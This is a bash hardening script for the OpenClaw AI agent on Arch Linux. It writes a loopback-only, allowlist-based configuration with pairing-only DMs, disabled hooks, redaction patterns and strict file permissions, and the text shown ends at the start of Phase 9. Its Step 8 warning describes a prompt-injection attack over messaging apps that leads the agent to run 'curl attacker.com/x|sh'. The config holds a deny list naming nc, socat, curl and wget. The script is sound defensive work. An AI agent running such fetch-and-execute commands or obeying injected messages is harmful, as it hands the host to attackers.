#!/usr/bin/env bash

# =============================================================================
# Script:      openclaw.sh
# Description: Deep-dive security hardening for OpenClaw (formerly ClawdBot/
#              Moltbot) on Arch Linux. OpenClaw is a self-hosted AI agent that
#              bridges messaging platforms to an AI coding agent with host
#              execution capabilities — making it a high-value target.
#
#              This script applies 27 hardening steps across 15 phases:
#                - System prerequisites and Node.js version verification
#                - Gateway authentication and bind-to-loopback enforcement
#                - Channel & DM policy lockdown (pairing-only)
#                - Tool policy and execution security (sandbox, allowlist)
#                - Docker sandbox configuration (optional)
#                - Plugin and skill registry lockdown
#                - Secure logging with sensitive data redaction
#                - File permissions and credential isolation
#                - Hardened systemd user service with drop-in overrides
#                - nftables firewall rules (optional)
#                - AppArmor confinement profile (optional)
#                - Workspace git initialization for rollback
#                - Security audit automation via systemd timer
#                - Dangerous command denylist documentation
#                - Secret scanning with detect-secrets
#
# Author:      Bruno Schmid @brulliant
# LinkedIn:    https://www.linkedin.com/in/schmidbruno/
#
# Usage:       sudo ./openclaw.sh -u USERNAME [-p PORT] [--with-sandbox]
#                                 [--with-firewall] [--with-apparmor] [-h]
#
# Requirements:
#   - Arch Linux with pacman
#   - Root privileges
#   - OpenClaw installed and accessible to the target user
#   - Node.js >= 22.12.0
#
# What this script does:
#   1.  Verifies Node.js >= 22.12.0 is installed (CVE patch baseline)
#   2.  Creates/verifies a dedicated non-root user for OpenClaw
#   3.  Generates a cryptographic gateway authentication token
#   4.  Writes a hardened openclaw.json with loopback-only binding
#   5.  Locks DM policy to "pairing" on all channels
#   6.  Sets tool profile to minimal "messaging" with shell blocked
#   7.  Configures exec security: sandbox, allowlist, safe bins only
#   8.  Disables elevated mode entirely
#   9.  Restricts web tools and disables browser automation
#   10. Blocks cross-context messaging between sessions
#   11. Configures Docker sandbox with strict resource limits (optional)
#   12. Locks down plugin system to deny-by-default
#   13. Disables hooks to prevent prompt injection
#   14. Configures secure logging with API key redaction
#   15. Sets up log rotation via logrotate
#   16. Locks down all file permissions (700/600 principle)
#   17. Creates a secure environment file for credentials
#   18. Creates a hardened systemd user service
#   19. Creates a systemd hardening drop-in with full sandboxing
#   20. Writes nftables firewall rules for loopback-only access (optional)
#   21. Creates an AppArmor confinement profile (optional)
#   22. Initializes workspace as a git repo for rollback
#   23. Runs openclaw security audit if CLI is available
#   24. Creates a weekly security audit systemd timer
#   25. Documents dangerous commands that must never be allowlisted
#   26. Installs and configures detect-secrets for secret scanning
#   27. Prints comprehensive security summary and next steps
# =============================================================================

set -euo pipefail

# --- Colors ---
readonly C_BLUE='\033[1;34m'
readonly C_RED='\033[1;31m'
readonly C_GREEN='\033[1;32m'
readonly C_YELLOW='\033[1;33m'
readonly C_NC='\033[0m'

msg()  { printf "%b[+]%b %s\n" "$C_GREEN" "$C_NC" "$1"; }
info() { printf "%b[*]%b %s\n" "$C_BLUE"  "$C_NC" "$1"; }
warn() { printf "%b[!]%b %s\n" "$C_YELLOW" "$C_NC" "$1"; }
err()  { printf "%b[!]%b %s\n" "$C_RED"   "$C_NC" "$1" >&2; exit 1; }

# --- Defaults ---
OC_USER=""
OC_PORT=18789
WITH_SANDBOX=false
WITH_FIREWALL=false
WITH_APPARMOR=false
LOGFILE="/var/log/openclaw-hardening-$(date +%Y%m%d-%H%M%S).log"

# --- Usage ---
usage() {
    cat <<EOF
Usage: sudo $0 [options]

Required:
  -u USERNAME         Linux user who runs OpenClaw (must not be root)

Optional:
  -p PORT             Gateway WebSocket port (default: $OC_PORT)
  --with-sandbox      Configure Docker/Podman sandbox for exec isolation
  --with-firewall     Write nftables rules for loopback-only gateway access
  --with-apparmor     Create and load an AppArmor confinement profile
  -h, --help          Show this help

Examples:
  sudo $0 -u alice
  sudo $0 -u alice -p 19000 --with-sandbox --with-firewall
  sudo $0 -u alice --with-sandbox --with-apparmor
EOF
    exit 0
}

# --- Parse Arguments ---
while [[ $# -gt 0 ]]; do
    case "$1" in
        -u)              OC_USER="$2"; shift 2 ;;
        -p)              OC_PORT="$2"; shift 2 ;;
        --with-sandbox)  WITH_SANDBOX=true; shift ;;
        --with-firewall) WITH_FIREWALL=true; shift ;;
        --with-apparmor) WITH_APPARMOR=true; shift ;;
        -h|--help)       usage ;;
        *)               err "Unknown option: $1" ;;
    esac
done

# --- Validate ---
[[ $(id -u) -eq 0 ]] || err "Must be run as root"
[[ -n "$OC_USER" ]] || err "Username is required (-u USERNAME)"
[[ "$OC_USER" != "root" ]] || err "OpenClaw must NOT run as root. Specify a non-root user."

# Validate port is numeric
if ! [[ "$OC_PORT" =~ ^[0-9]+$ ]] || [[ "$OC_PORT" -lt 1 ]] || [[ "$OC_PORT" -gt 65535 ]]; then
    err "Invalid port number: $OC_PORT (must be 1-65535)"
fi

# Redirect output to logfile as well
exec > >(tee -a "$LOGFILE") 2>&1

# --- Derived paths ---
OC_HOME="/home/$OC_USER"
OC_DIR="$OC_HOME/.openclaw"
OC_CONFIG="$OC_DIR/openclaw.json"
OC_WORKSPACE="$OC_DIR/workspace"
OC_CREDENTIALS="$OC_DIR/credentials"
OC_ENV_FILE="$OC_DIR/.env"
OC_SESSIONS_GLOB="$OC_DIR/agents/*/sessions"
OC_EXEC_APPROVALS="$OC_DIR/exec-approvals.json"

echo
echo -e "${C_GREEN}========================================================================${C_NC}"
echo -e "${C_GREEN}    OpenClaw Security Hardening for Arch Linux${C_NC}"
echo -e "${C_GREEN}========================================================================${C_NC}"
echo
echo -e "${C_RED}    WARNING: OpenClaw is an AI agent with HOST EXECUTION capabilities.${C_NC}"
echo -e "${C_RED}    A misconfigured instance grants remote shell access to ANYONE who${C_NC}"
echo -e "${C_RED}    can send a direct message via any connected messaging platform.${C_NC}"
echo -e "${C_RED}    923+ instances have been found exposed on Shodan.${C_NC}"
echo -e "${C_RED}    This script applies defense-in-depth hardening.${C_NC}"
echo
info "Target user:        $OC_USER"
info "OpenClaw home:      $OC_DIR"
info "Gateway port:       $OC_PORT"
info "Docker sandbox:     $WITH_SANDBOX"
info "nftables firewall:  $WITH_FIREWALL"
info "AppArmor profile:   $WITH_APPARMOR"
info "Log:                $LOGFILE"
echo

# =============================================================================
# PHASE 1: SYSTEM PREREQUISITES
# =============================================================================

echo -e "${C_BLUE}--- Phase 1: System Prerequisites ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 1: Verify Node.js version
# -----------------------------------------------------------------------------

msg "Step 1: Verifying Node.js version..."

if ! command -v node &>/dev/null; then
    err "Node.js is not installed. Install Node.js >= 22.12.0 first: pacman -S nodejs"
fi

NODE_VER_RAW=$(node --version 2>/dev/null)
NODE_VER="${NODE_VER_RAW#v}"
info "Detected Node.js version: $NODE_VER_RAW"

# Parse major.minor.patch
IFS='.' read -r NODE_MAJOR NODE_MINOR NODE_PATCH <<< "$NODE_VER"

if [[ "$NODE_MAJOR" -lt 22 ]]; then
    err "Node.js $NODE_VER_RAW is too old. OpenClaw requires >= 22.12.0 (CVE patches). Upgrade: pacman -Syu nodejs"
elif [[ "$NODE_MAJOR" -eq 22 ]] && [[ "$NODE_MINOR" -lt 12 ]]; then
    warn "Node.js $NODE_VER_RAW is below 22.12.0 — missing critical CVE patches."
    warn "Strongly recommended: pacman -Syu nodejs"
    warn "CVEs addressed in 22.12.0+: HTTP request smuggling, path traversal,"
    warn "V8 type confusion, and permission model bypasses."
elif [[ "$NODE_MAJOR" -eq 22 ]] && [[ "$NODE_MINOR" -eq 12 ]] && [[ "$NODE_PATCH" -eq 0 ]]; then
    msg "Node.js $NODE_VER_RAW meets the minimum security baseline (22.12.0)"
else
    msg "Node.js $NODE_VER_RAW meets the security baseline (>= 22.12.0)"
fi

# Check for pnpm (OpenClaw's package manager)
if command -v pnpm &>/dev/null; then
    PNPM_VER=$(pnpm --version 2>/dev/null || echo "unknown")
    info "pnpm version: $PNPM_VER"
else
    warn "pnpm not found. OpenClaw uses pnpm as its package manager."
    warn "Install with: npm install -g pnpm"
fi

# -----------------------------------------------------------------------------
# Step 2: Create/verify dedicated user
# -----------------------------------------------------------------------------

msg "Step 2: Verifying dedicated user '$OC_USER'..."

if id "$OC_USER" &>/dev/null; then
    info "User '$OC_USER' already exists"

    # Verify user is not UID 0
    USER_UID=$(id -u "$OC_USER")
    if [[ "$USER_UID" -eq 0 ]]; then
        err "User '$OC_USER' has UID 0 (root). OpenClaw must NOT run as root."
    fi
    msg "User '$OC_USER' (UID $USER_UID) is non-root — OK"
else
    info "Creating restricted user '$OC_USER'..."
    useradd \
        --system \
        --shell /bin/bash \
        --create-home \
        --home-dir "$OC_HOME" \
        --comment "OpenClaw AI agent service account" \
        "$OC_USER"
    msg "Created system user: $OC_USER"
fi

# Add to docker group if Docker is present and sandbox requested
if [[ "$WITH_SANDBOX" == true ]]; then
    if getent group docker &>/dev/null; then
        if id -nG "$OC_USER" | grep -qw docker; then
            info "User '$OC_USER' is already in the docker group"
        else
            usermod -aG docker "$OC_USER"
            msg "Added '$OC_USER' to docker group for sandbox mode"
        fi
    fi
fi

# Ensure OpenClaw directories exist
mkdir -p "$OC_DIR" "$OC_WORKSPACE" "$OC_CREDENTIALS"
chown "$OC_USER:$OC_USER" "$OC_DIR" "$OC_WORKSPACE" "$OC_CREDENTIALS"

echo

# =============================================================================
# PHASE 2: GATEWAY HARDENING
# =============================================================================

echo -e "${C_BLUE}--- Phase 2: Gateway Hardening ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 3: Generate gateway authentication token
# -----------------------------------------------------------------------------

msg "Step 3: Generating gateway authentication token..."

GATEWAY_TOKEN=$(openssl rand -hex 32)
info "Generated 256-bit cryptographic token for gateway authentication"
info "Token will be stored in $OC_ENV_FILE (never in openclaw.json)"

# -----------------------------------------------------------------------------
# Step 4: Write hardened openclaw.json
# -----------------------------------------------------------------------------

msg "Step 4: Writing hardened openclaw.json..."

# Back up existing configuration
if [[ -f "$OC_CONFIG" ]]; then
    BACKUP_NAME="$OC_CONFIG.backup.$(date +%Y%m%d-%H%M%S)"
    cp -a "$OC_CONFIG" "$BACKUP_NAME"
    chown "$OC_USER:$OC_USER" "$BACKUP_NAME"
    msg "Backed up existing config to: $BACKUP_NAME"
fi

# Determine sandbox mode for exec based on flag
if [[ "$WITH_SANDBOX" == true ]]; then
    EXEC_HOST_MODE="sandbox"
    SANDBOX_MODE_CFG="all"
else
    EXEC_HOST_MODE="sandbox"
    SANDBOX_MODE_CFG="off"
fi

cat > "$OC_CONFIG" <<'OPENCLAW_JSON_EOF'
{
  "$schema": "https://openclaw.dev/config-schema.json",
  "_comment": [
    "Hardened OpenClaw configuration",
    "Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh",
    "ALL sensitive values are referenced via environment variables.",
    "DO NOT put API keys or tokens directly in this file."
  ],

  "gateway": {
    "bind": "loopback",
OPENCLAW_JSON_EOF

# Now write the port and remaining config with variable interpolation
cat >> "$OC_CONFIG" <<OPENCLAW_JSON_PORT
    "port": $OC_PORT,
OPENCLAW_JSON_PORT

cat >> "$OC_CONFIG" <<'OPENCLAW_JSON_GATEWAY'
    "auth": {
      "mode": "token",
      "token": "${OPENCLAW_GATEWAY_TOKEN}"
    },
    "controlUi": {
      "allowInsecureAuth": false,
      "dangerouslyDisableDeviceAuth": false
    },
    "trustedProxies": [],
    "tailscale": {
      "mode": "off"
    },
    "rateLimiting": {
      "enabled": true,
      "maxRequestsPerMinute": 60,
      "maxConnectionsPerIp": 5
    }
  },

  "channels": {
    "_comment": "All channels default to pairing-only DM policy. Never set to 'open'.",
    "defaults": {
      "dmPolicy": "pairing",
      "requireMention": true,
      "sessionScope": "per-channel-peer",
      "maxSessionDuration": "4h",
      "idleTimeout": "30m"
    },
    "whatsapp": {
      "dmPolicy": "pairing",
      "requireMention": true,
      "sessionScope": "per-channel-peer"
    },
    "telegram": {
      "dmPolicy": "pairing",
      "requireMention": true,
      "sessionScope": "per-channel-peer"
    },
    "discord": {
      "dmPolicy": "pairing",
      "requireMention": true,
      "sessionScope": "per-channel-peer"
    },
    "slack": {
      "dmPolicy": "pairing",
      "requireMention": true,
      "sessionScope": "per-channel-peer"
    },
    "signal": {
      "dmPolicy": "pairing",
      "requireMention": true,
      "sessionScope": "per-channel-peer"
    },
    "matrix": {
      "dmPolicy": "pairing",
      "requireMention": true,
      "sessionScope": "per-channel-peer"
    },
    "teams": {
      "dmPolicy": "pairing",
      "requireMention": true,
      "sessionScope": "per-channel-peer"
    },
    "imessage": {
      "dmPolicy": "pairing",
      "requireMention": true,
      "sessionScope": "per-channel-peer"
    }
  },

  "tools": {
    "profile": "messaging",
    "_comment": "Messaging profile: AI can read/reply but cannot execute commands by default."
  },

  "exec": {
OPENCLAW_JSON_GATEWAY

cat >> "$OC_CONFIG" <<OPENCLAW_JSON_EXEC
    "host": "$EXEC_HOST_MODE",
OPENCLAW_JSON_EXEC

cat >> "$OC_CONFIG" <<'OPENCLAW_JSON_EXEC2'
    "security": "allowlist",
    "ask": "on-miss",
    "timeout": 300,
    "safeBins": [
      "jq",
      "grep",
      "cut",
      "sort",
      "uniq",
      "head",
      "tail",
      "tr",
      "wc",
      "cat",
      "ls",
      "pwd",
      "date",
      "echo",
      "whoami",
      "uname",
      "file",
      "stat",
      "basename",
      "dirname",
      "realpath"
    ],
    "denyBins": [
      "rm",
      "mkfs",
      "dd",
      "fdisk",
      "parted",
      "mount",
      "umount",
      "chroot",
      "insmod",
      "modprobe",
      "rmmod",
      "iptables",
      "nft",
      "shutdown",
      "reboot",
      "poweroff",
      "systemctl",
      "passwd",
      "useradd",
      "userdel",
      "usermod",
      "groupadd",
      "visudo",
      "su",
      "sudo",
      "pkexec",
      "nc",
      "ncat",
      "socat",
      "ssh",
      "scp",
      "rsync",
      "wget",
      "curl"
    ],
    "maxOutputSize": "64KB",
    "env": {
      "PATH": "/usr/local/bin:/usr/bin:/bin",
      "HOME": "/tmp/openclaw-exec",
      "TERM": "dumb"
    }
  },

  "elevated": {
    "enabled": false,
    "_comment": [
      "DANGER: Elevated mode grants the AI agent unrestricted shell access.",
      "With allowFrom set to wildcard, ANY messaging contact can trigger",
      "arbitrary command execution on the host. Keep this DISABLED.",
      "If you absolutely must enable it, use a strict allowFrom list",
      "and combine with Docker sandbox mode."
    ]
  },

  "web": {
    "search": {
      "enabled": true,
      "maxChars": 50000
    },
    "fetch": {
      "enabled": true,
      "maxChars": 100000,
      "allowedDomains": [],
      "blockedDomains": []
    },
    "browser": {
      "enabled": false,
      "_comment": "Browser automation is disabled — it can be weaponized for SSRF and data exfiltration."
    }
  },

  "crossContext": {
    "allowAcrossProviders": false,
    "enableMarkers": true,
    "_comment": "Cross-context messaging is disabled to prevent session hijacking and data leakage between channels."
  },

OPENCLAW_JSON_EXEC2

# Write sandbox section conditionally
if [[ "$WITH_SANDBOX" == true ]]; then
cat >> "$OC_CONFIG" <<'OPENCLAW_JSON_SANDBOX'
  "sandbox": {
    "mode": "all",
    "sessionScope": true,
    "workspaceAccess": "ro",
    "docker": {
      "network": "none",
      "readOnlyRoot": true,
      "capDrop": ["ALL"],
      "pidsLimit": 256,
      "memory": "512m",
      "cpus": 0.5,
      "user": "1000:1000",
      "tmpfsSize": "64m",
      "noNewPrivileges": true
    },
    "_comment": "Docker sandbox: no network, read-only root, all caps dropped, resource-limited."
  },

OPENCLAW_JSON_SANDBOX
else
cat >> "$OC_CONFIG" <<'OPENCLAW_JSON_NOSANDBOX'
  "sandbox": {
    "mode": "off",
    "_comment": "Sandbox not enabled. Re-run with --with-sandbox for Docker isolation."
  },

OPENCLAW_JSON_NOSANDBOX
fi

cat >> "$OC_CONFIG" <<'OPENCLAW_JSON_PLUGINS'
  "plugins": {
    "enabled": true,
    "allowList": [],
    "denyByDefault": true,
    "autoUpdate": false,
    "_comment": "Plugin system is deny-by-default. Explicitly allowlist trusted plugins only."
  },

  "skills": {
    "clawhub": {
      "autoInstall": false,
      "requireSignature": true,
      "_comment": "ClawHub skill registry: auto-install disabled, signature verification required."
    }
  },

  "hooks": {
    "enabled": false,
    "_comment": "Hooks are disabled to prevent prompt injection via workspace hook files."
  },

  "workspace": {
    "trustPolicy": "manual",
    "ignoreFiles": [
      "AGENTS.md",
      "SOUL.md",
      "TOOLS.md",
      ".openclaw",
      ".clawhub"
    ],
    "_comment": [
      "Trust policy is manual — workspace files are NOT automatically injected into context.",
      "AGENTS.md, SOUL.md, TOOLS.md are ignored to prevent prompt injection via workspace files."
    ]
  },

  "logging": {
    "level": "info",
    "redactSensitive": "tools",
    "customRedactionPatterns": [
      "sk-[a-zA-Z0-9_-]{20,}",
      "sk-ant-[a-zA-Z0-9_-]{20,}",
      "anthropic[_-]?api[_-]?key[=:\\s]+[a-zA-Z0-9_-]+",
      "Bearer\\s+[a-zA-Z0-9._-]+",
      "-----BEGIN\\s+(RSA|EC|OPENSSH|PGP)\\s+PRIVATE\\s+KEY-----",
      "password\\s*[:=]\\s*\\S+",
      "OPENAI_API_KEY[=:\\s]+[a-zA-Z0-9_-]+",
      "ghp_[a-zA-Z0-9]{36,}",
      "glpat-[a-zA-Z0-9_-]{20,}",
      "xox[bpors]-[a-zA-Z0-9-]+"
    ],
    "_comment": "Sensitive data (API keys, tokens, passwords, PEM keys) is redacted from all tool output logs."
  },

  "privacy": {
    "telemetry": false,
    "crashReports": false,
    "analytics": false
  }
}
OPENCLAW_JSON_PLUGINS

chown "$OC_USER:$OC_USER" "$OC_CONFIG"
chmod 600 "$OC_CONFIG"
msg "Hardened openclaw.json written to: $OC_CONFIG (mode 600)"

echo

# =============================================================================
# PHASE 3: CHANNEL & DM POLICY LOCKDOWN
# =============================================================================

echo -e "${C_BLUE}--- Phase 3: Channel & DM Policy Lockdown ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 5: DM policy verification (already written into config above)
# -----------------------------------------------------------------------------

msg "Step 5: DM policy set to 'pairing' for all channels"
info "All channels configured with:"
info "  - dmPolicy: pairing (requires device pairing code approval)"
info "  - requireMention: true (groups require @mention to activate)"
info "  - sessionScope: per-channel-peer (session isolation per contact per channel)"
warn "NEVER set dmPolicy to 'open' — this allows ANYONE to trigger AI actions"

echo

# =============================================================================
# PHASE 4: TOOL POLICY & EXECUTION SECURITY
# =============================================================================

echo -e "${C_BLUE}--- Phase 4: Tool Policy & Execution Security ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 6: Tool profile (already in config)
# -----------------------------------------------------------------------------

msg "Step 6: Tool profile set to 'messaging' (minimal)"
info "The 'messaging' profile allows AI to read and reply to messages"
info "Shell execution, file writes, and code execution are blocked by default"

# -----------------------------------------------------------------------------
# Step 7: Exec security (already in config)
# -----------------------------------------------------------------------------

msg "Step 7: Exec security configured"
info "  - host: $EXEC_HOST_MODE"
info "  - security: allowlist (only approved commands can run)"
info "  - ask: on-miss (user must approve unrecognized commands)"
info "  - timeout: 300s (commands killed after 5 minutes)"
info "  - safeBins: read-only utilities only (jq, grep, cat, ls, etc.)"
info "  - denyBins: destructive and network commands blocked"

# -----------------------------------------------------------------------------
# Step 8: Disable elevated mode
# -----------------------------------------------------------------------------

msg "Step 8: Elevated mode DISABLED"
echo
echo -e "${C_RED}    ================================================================${C_NC}"
echo -e "${C_RED}    ELEVATED MODE WARNING${C_NC}"
echo -e "${C_RED}    ================================================================${C_NC}"
echo -e "${C_RED}    OpenClaw's elevated mode grants the AI agent UNRESTRICTED${C_NC}"
echo -e "${C_RED}    shell access to the host machine. Combined with:${C_NC}"
echo -e "${C_RED}      - dmPolicy: 'open' (anyone can message the AI)${C_NC}"
echo -e "${C_RED}      - allowFrom: '*' (wildcard, no contact filtering)${C_NC}"
echo -e "${C_RED}    This creates a REMOTE CODE EXECUTION vulnerability${C_NC}"
echo -e "${C_RED}    accessible to ANYONE on any connected messaging platform.${C_NC}"
echo -e "${C_RED}${C_NC}"
echo -e "${C_RED}    Attack scenario: An attacker sends a crafted message via${C_NC}"
echo -e "${C_RED}    WhatsApp/Telegram/Discord containing a prompt injection${C_NC}"
echo -e "${C_RED}    that instructs the AI to execute 'curl attacker.com/x|sh'.${C_NC}"
echo -e "${C_RED}${C_NC}"
echo -e "${C_RED}    Elevated mode is now DISABLED in openclaw.json.${C_NC}"
echo -e "${C_RED}    DO NOT re-enable it unless you understand the risks.${C_NC}"
echo -e "${C_RED}    ================================================================${C_NC}"
echo

# -----------------------------------------------------------------------------
# Step 9: Web tool restrictions (already in config)
# -----------------------------------------------------------------------------

msg "Step 9: Web tool restrictions applied"
info "  - Web search: enabled (50KB char limit)"
info "  - Web fetch: enabled (100KB char limit)"
info "  - Browser automation: DISABLED (prevents SSRF, data exfiltration)"

# -----------------------------------------------------------------------------
# Step 10: Cross-context messaging blocked (already in config)
# -----------------------------------------------------------------------------

msg "Step 10: Cross-context messaging blocked"
info "  - allowAcrossProviders: false"
info "  - enableMarkers: true (context boundaries are marked)"
info "  - Prevents session data leakage between channels"

echo

# =============================================================================
# PHASE 5: SANDBOX CONFIGURATION (--with-sandbox)
# =============================================================================

echo -e "${C_BLUE}--- Phase 5: Sandbox Configuration ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 11: Docker sandbox
# -----------------------------------------------------------------------------

if [[ "$WITH_SANDBOX" == true ]]; then
    msg "Step 11: Configuring Docker sandbox..."

    # Check for Docker or Podman
    CONTAINER_RUNTIME=""
    if command -v docker &>/dev/null; then
        CONTAINER_RUNTIME="docker"
        DOCKER_VER=$(docker --version 2>/dev/null || echo "unknown")
        info "Docker detected: $DOCKER_VER"
    elif command -v podman &>/dev/null; then
        CONTAINER_RUNTIME="podman"
        PODMAN_VER=$(podman --version 2>/dev/null || echo "unknown")
        info "Podman detected: $PODMAN_VER"
    else
        warn "Neither Docker nor Podman is installed"
        warn "Install Docker: pacman -S docker && systemctl enable --now docker"
        warn "Or install Podman: pacman -S podman"
        warn "Sandbox configuration written to config but will not work without a container runtime"
    fi

    if [[ -n "$CONTAINER_RUNTIME" ]]; then
        # Verify the container runtime is running
        if [[ "$CONTAINER_RUNTIME" == "docker" ]]; then
            if systemctl is-active --quiet docker; then
                msg "Docker daemon is running"
            else
                warn "Docker daemon is not running. Start it: systemctl start docker"
            fi
        fi

        msg "Sandbox configured in openclaw.json with:"
        info "  - mode: all (all exec commands run in sandbox)"
        info "  - sessionScope: true (fresh container per session)"
        info "  - workspaceAccess: ro (read-only workspace mount)"
        info "  - network: none (no network access from sandbox)"
        info "  - readOnlyRoot: true"
        info "  - capDrop: ALL (no Linux capabilities)"
        info "  - pidsLimit: 256 (fork bomb protection)"
        info "  - memory: 512m (OOM protection)"
        info "  - cpus: 0.5 (CPU throttling)"
        info "  - user: 1000:1000 (non-root in container)"
        info "  - noNewPrivileges: true"
    fi
else
    info "Step 11: Sandbox not requested (use --with-sandbox to enable)"
    warn "Without sandbox, exec commands run directly on the host"
    warn "The allowlist and denylist in exec config are your primary defense"
fi

echo

# =============================================================================
# PHASE 6: PLUGIN & SKILL SECURITY
# =============================================================================

echo -e "${C_BLUE}--- Phase 6: Plugin & Skill Security ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 12: Plugin lockdown (already in config)
# -----------------------------------------------------------------------------

msg "Step 12: Plugin system locked down"
info "  - plugins.enabled: true (system active but deny-by-default)"
info "  - plugins.allowList: [] (empty — no plugins allowed)"
info "  - plugins.denyByDefault: true"
info "  - plugins.autoUpdate: false"
info "  - ClawHub autoInstall: false, requireSignature: true"
warn "Plugins can load arbitrary npm packages. Only allowlist trusted, audited plugins."

# -----------------------------------------------------------------------------
# Step 13: Hooks disabled (already in config)
# -----------------------------------------------------------------------------

msg "Step 13: Hooks disabled"
info "  - hooks.enabled: false"
info "  - Workspace hook files cannot inject prompts into agent context"
warn "Hooks can be used for prompt injection via AGENTS.md, SOUL.md, TOOLS.md"
warn "The workspace.ignoreFiles list also blocks these files from context injection"

echo

# =============================================================================
# PHASE 7: LOGGING & REDACTION
# =============================================================================

echo -e "${C_BLUE}--- Phase 7: Logging & Redaction ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 14: Secure logging (already in config)
# -----------------------------------------------------------------------------

msg "Step 14: Secure logging configured"
info "  - level: info"
info "  - redactSensitive: tools (tool output is redacted)"
info "  - Custom redaction patterns for:"
info "    * OpenAI API keys (sk-*)"
info "    * Anthropic API keys (sk-ant-*)"
info "    * Bearer tokens"
info "    * PEM private keys (RSA, EC, OPENSSH, PGP)"
info "    * Password assignments"
info "    * GitHub personal access tokens (ghp_*)"
info "    * GitLab tokens (glpat-*)"
info "    * Slack tokens (xox[bpors]-*)"
info "  - Telemetry, crash reports, and analytics: disabled"

# -----------------------------------------------------------------------------
# Step 15: Log rotation
# -----------------------------------------------------------------------------

msg "Step 15: Setting up log rotation..."

OC_LOG_DIR="$OC_DIR/logs"
mkdir -p "$OC_LOG_DIR"
chown "$OC_USER:$OC_USER" "$OC_LOG_DIR"
chmod 750 "$OC_LOG_DIR"

cat > "/etc/logrotate.d/openclaw" <<EOF
# Log rotation for OpenClaw
# Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh

$OC_LOG_DIR/*.log
$OC_DIR/agents/*/sessions/*.log {
    daily
    missingok
    rotate 14
    compress
    delaycompress
    notifempty
    create 640 $OC_USER $OC_USER
    sharedscripts
    postrotate
        # Signal OpenClaw to reopen log files if running
        /usr/bin/killall -USR1 openclaw 2>/dev/null || true
    endscript
}
EOF

msg "Logrotate config created: /etc/logrotate.d/openclaw"

echo

# =============================================================================
# PHASE 8: FILE PERMISSIONS & CREDENTIAL ISOLATION
# =============================================================================

echo -e "${C_BLUE}--- Phase 8: File Permissions & Credential Isolation ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 16: Lock down file permissions
# -----------------------------------------------------------------------------

msg "Step 16: Locking down file permissions..."

# Main OpenClaw directory — owner only
chmod 700 "$OC_DIR"
chown "$OC_USER:$OC_USER" "$OC_DIR"
info "  $OC_DIR -> 700"

# Config file — owner read/write only
if [[ -f "$OC_CONFIG" ]]; then
    chmod 600 "$OC_CONFIG"
    chown "$OC_USER:$OC_USER" "$OC_CONFIG"
    info "  $OC_CONFIG -> 600"
fi

# Credentials directory — owner only
mkdir -p "$OC_CREDENTIALS"
chmod 700 "$OC_CREDENTIALS"
chown "$OC_USER:$OC_USER" "$OC_CREDENTIALS"
info "  $OC_CREDENTIALS/ -> 700"

# Lock down all files in credentials directory
if [[ -d "$OC_CREDENTIALS" ]]; then
    find "$OC_CREDENTIALS" -type f -exec chmod 600 {} \;
    find "$OC_CREDENTIALS" -type f -exec chown "$OC_USER:$OC_USER" {} \;
    info "  $OC_CREDENTIALS/* -> 600"
fi

# Session directories — owner only (contain conversation transcripts)
for sessions_dir in $OC_DIR/agents/*/sessions; do
    if [[ -d "$sessions_dir" ]]; then
        chmod 700 "$sessions_dir"
        chown "$OC_USER:$OC_USER" "$sessions_dir"
        info "  $sessions_dir -> 700"
    fi
done

# Exec approvals file
if [[ -f "$OC_EXEC_APPROVALS" ]]; then
    chmod 600 "$OC_EXEC_APPROVALS"
    chown "$OC_USER:$OC_USER" "$OC_EXEC_APPROVALS"
    info "  $OC_EXEC_APPROVALS -> 600"
fi

# Workspace — owner rwx, group/other none
chmod 700 "$OC_WORKSPACE"
chown "$OC_USER:$OC_USER" "$OC_WORKSPACE"
info "  $OC_WORKSPACE/ -> 700"

# Log directory
chmod 750 "$OC_LOG_DIR"
chown "$OC_USER:$OC_USER" "$OC_LOG_DIR"
info "  $OC_LOG_DIR/ -> 750"

# Recursively fix ownership of entire .openclaw tree
chown -R "$OC_USER:$OC_USER" "$OC_DIR"

msg "File permissions locked down"

# -----------------------------------------------------------------------------
# Step 17: Create secure environment file
# -----------------------------------------------------------------------------

msg "Step 17: Creating secure environment file..."

# Back up existing env file
if [[ -f "$OC_ENV_FILE" ]]; then
    BACKUP_ENV="$OC_ENV_FILE.backup.$(date +%Y%m%d-%H%M%S)"
    cp -a "$OC_ENV_FILE" "$BACKUP_ENV"
    chown "$OC_USER:$OC_USER" "$BACKUP_ENV"
    chmod 600 "$BACKUP_ENV"
    msg "Backed up existing .env to: $BACKUP_ENV"
fi

cat > "$OC_ENV_FILE" <<EOF
# =============================================================================
# OpenClaw secure environment file
# Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh
#
# WARNING: This file contains sensitive credentials. It is chmod 600 and
#          owned by $OC_USER:$OC_USER. NEVER commit this file to version control.
#          NEVER store secrets in openclaw.json — use this file instead.
# =============================================================================

# --- Gateway Authentication Token ---
# This token is required to connect to the OpenClaw WebSocket gateway.
# It was generated by openssl rand -hex 32 (256-bit entropy).
OPENCLAW_GATEWAY_TOKEN=$GATEWAY_TOKEN

# --- AI Provider API Keys ---
# Replace these placeholders with your actual API keys.
# These keys are loaded by the OpenClaw runtime, NOT stored in openclaw.json.
ANTHROPIC_API_KEY=REPLACE_WITH_YOUR_ANTHROPIC_API_KEY
OPENAI_API_KEY=REPLACE_WITH_YOUR_OPENAI_API_KEY

# --- Optional Provider Keys ---
# GOOGLE_AI_API_KEY=
# MISTRAL_API_KEY=
# GROQ_API_KEY=

# --- Node.js Security Settings ---
NODE_ENV=production
NODE_OPTIONS=--max-old-space-size=1024 --max-http-header-size=8192 --disable-proto=throw

# --- OpenClaw Runtime ---
OPENCLAW_LOG_LEVEL=info
OPENCLAW_TELEMETRY=false
EOF

# Set strict permissions using install for atomic creation
chown "$OC_USER:$OC_USER" "$OC_ENV_FILE"
chmod 600 "$OC_ENV_FILE"
msg "Secure environment file created: $OC_ENV_FILE (mode 600)"
warn "IMPORTANT: Edit $OC_ENV_FILE to add your actual API keys"

echo

# =============================================================================
# PHASE 9: SYSTEMD SERVICE HARDENING
# =============================================================================

echo -e "${C_BLUE}--- Phase 9: systemd Service Hardening ---${C_NC}"

# -----------------------------------------------------------------------------
